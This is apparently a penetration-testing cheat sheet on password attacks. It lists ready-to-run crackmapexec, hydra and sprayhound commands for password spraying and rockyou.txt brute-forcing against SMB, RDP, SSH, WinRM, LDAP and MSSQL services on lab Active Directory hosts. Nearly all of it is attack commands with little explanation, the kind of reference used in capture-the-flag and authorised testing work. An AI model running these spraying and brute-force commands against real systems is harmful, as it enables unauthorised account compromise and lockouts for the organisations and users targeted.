# Password Attack

### Password Spray

#### Only CTF - SMB (139,445) - Checking login == password using wordlist

{% code overflow="wrap" %}
```bash
# Try same username and password
crackmapexec smb $RHOST -u usernames.txt -p usernames.txt
crackmapexec smb $RHOST -u usernames.txt -p usernames.txt --no-bruteforce --continue-on-success

# Try different protocols with no brute force 
for p in 'ftp' 'ssh' 'smb' 'winrm' 'ldap' 'mssql'; do cme $p $RHOST -u usernames.txt -p usernames.txt --no-bruteforce --continue-on-success; done

# RDP 
hydra -V -f -L usernames.txt -P usernames.txt rdp://10.0.2.5 -V

# Try adding some updates on lower and upper cases (e.g. Ryan, ryan, RYAN)

tr '[:lower:]' '[:upper:]' < users.txt > users2.txt
tr '[:upper:]' '[:lower:]' < users.txt >> users2.txt
crackmapexec smb $RHOST -u users2.txt -p users2.txt
```
{% endcode %}

#### AD Password Spray

{% code overflow="wrap" %}
```bash
# A single password spray for multiple users 
cme smb $RHOST -u usernames.txt -p June2013 
cme smb $RHOST -u usernames.txt -p Summer2020 
# Multiple password spray for multiple users
cme smb $RHOST -u usernames.txt -p passwords.txt

# No bruteforce possible with this one as 1 user = 1 password
cme smb 192.168.56.11 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-succes
```
{% endcode %}

#### Sprayhound

{% code overflow="wrap" %}
```bash
# https://github.com/Hackndo/sprayhound
# --lower  User as pass with lowercase password
sprayhound -U usernames.txt -d north.sevenkingdoms.local -dc 192.168.56.11 --lower

# We could try sprayhound with a valid user to avoid locking account (option -t to set the number of try left)
sprayhound -U usernames.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2
```
{% endcode %}

### Bruteforce Attack

#### cme + rockyou.txt

{% code overflow="wrap" %}
```bash
# Bruteforcing with limited number of passwords. 
cme smb 192.168.56.11 -u usernames.txt -p passwords.txt

# RDP 
hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V

# Try different protocols with bruteforce 
for p in 'ftp' 'ssh' 'smb' 'winrm' 'ldap' 'mssql'; do cme $p $RHOST -u usernames.txt -p usernames.txt --continue-on-success; done

# You might need to clean up rockyou.txt and use the cleaned one.
iconv -f UTF-8 -t UTF-8 -c < /usr/share/wordlists/rockyou.txt | sed 's/[^[:print:]]//g' > cleaned_rockyou.txt
# Check a password for a user within 5 min 
timeout 5m crackmapexec smb $RHOST -u freedy -p /usr/share/wordlists/rockyou.txt
timeout 5m crackmapexec smb $RHOST -u calvin -p /usr/share/wordlists/rockyou.txt
timeout 5m crackmapexec smb $RHOST -u johana -p /usr/share/wordlists/rockyou.txt
```
{% endcode %}

